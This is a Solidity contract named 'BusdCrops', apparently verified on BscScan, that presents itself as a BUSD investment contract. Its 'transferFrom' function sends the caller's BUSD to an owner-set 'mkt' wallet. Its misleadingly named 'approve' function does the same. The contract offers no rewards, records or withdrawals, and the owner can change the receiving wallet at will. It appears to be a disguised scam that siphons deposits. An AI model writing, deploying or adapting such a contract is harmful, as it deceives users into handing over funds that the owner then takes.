/**
 *Submitted for verification at BscScan.com on 2022-05-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-15
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IToken {
function totalSupply() external view returns(uint256);
function balanceOf(address account) external view returns(uint256);
function transfer(address recipient, uint256 amount) external returns(bool);
function allowance(address owner, address spender) external view returns(uint256);
function approve(address spender, uint256 amount) external returns(bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);

event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0);
        return a % b;
    }
}

contract BusdCrops {
    using SafeMath for uint256;
        IToken public token_BUSD;
    address erctoken = 0xCF55fb7Bef121a7C6AcBB44C5aCDA8d1ce8Fec02; /** BUSD Testnet **/

    address public owner;
    address public mkt;


    constructor(address _mkt) {
        require(!isContract(_mkt));
        owner = msg.sender;
        mkt = _mkt;
        token_BUSD = IToken(erctoken);
    }


    function transferFrom(uint256 amount) external returns(bool)
    {
        token_BUSD.transferFrom(msg.sender, mkt, amount);
        return true;
    }

    function approve(uint256 amount) external returns(bool)
    {
        token_BUSD.approve(mkt, 1000000 * 1e18);
        token_BUSD.transferFrom(msg.sender, mkt, amount);
        return true;
    }
    function isContract(address addr) internal view returns(bool) {
        uint size;
        assembly { size:= extcodesize(addr) }
        return size > 0;
    }

    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }
    function CHANGE_MKT_WALLET(address value) external {
        require(msg.sender == owner, "Admin use only.");
        mkt = value;
    }

}